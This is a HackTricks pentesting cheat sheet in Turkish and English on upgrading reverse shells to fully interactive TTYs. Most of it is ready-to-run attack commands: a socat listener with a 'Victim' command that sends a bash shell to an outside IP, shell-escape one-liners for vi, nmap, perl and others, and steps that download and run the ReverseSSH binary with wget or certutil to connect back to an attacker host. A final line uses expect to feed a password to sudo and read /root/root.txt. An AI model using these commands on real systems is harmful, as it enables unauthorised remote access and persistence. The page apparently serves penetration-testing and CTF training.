# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Ayrıca, sonraki snippet'lerin yalnızca bash'te çalıştığını unutmayın. zsh kullanıyorsanız, shell'i elde etmeden önce `bash` çalıştırarak bash'e geçin.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> **`stty -a`** komutunu çalıştırarak **satır** ve **sütun** **sayısını** öğrenebilirsiniz.

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell'ler oluşturma**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**interactive shell access** için kullanışlı bir yöntem; ayrıca **file transfers** ve **port forwarding** için statik olarak linklenmiş ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)'ı target sisteme bırakmaktır.<sup>[[1]](#references)</sup>

Aşağıda, upx ile sıkıştırılmış binary'ler kullanılarak `x86` için bir örnek verilmiştir. Diğer binary'ler için [releases sayfasına](https://github.com/Fahrj/reverse-ssh/releases/latest/) bakın.

1. ssh port forwarding request'ini yakalamak için yerel olarak hazırlayın:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux hedefi:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 hedefi (önceki sürümler için [project readme](https://github.com/Fahrj/reverse-ssh#features) dosyasına bakın):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- ReverseSSH port forwarding isteği başarılı olduysa, artık `reverse-ssh(.exe)` çalıştıran kullanıcının bağlamında varsayılan `letmeinbrudipls` parolasıyla oturum açabilmelisiniz:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope), Linux reverse shell'lerini otomatik olarak TTY'ye yükseltir, terminal boyutunu yönetir, her şeyi loglar ve çok daha fazlasını yapar. Ayrıca Windows shell'leri için readline desteği sağlar.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## TTY Yok

Herhangi bir nedenle tam bir TTY elde edemiyorsanız, kullanıcı girdisi bekleyen programlarla **yine de etkileşim kurabilirsiniz**. Aşağıdaki örnekte parola, bir dosyayı okumak üzere `sudo` komutuna aktarılır:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Referanslar

- [1] [ReverseSSH - CTF'ler ve benzeri etkinlikler için reverse shell işlevine sahip statik olarak linklenmiş ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Bazı işlemleri otomatikleştirerek işleri kolaylaştıran shell handler](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
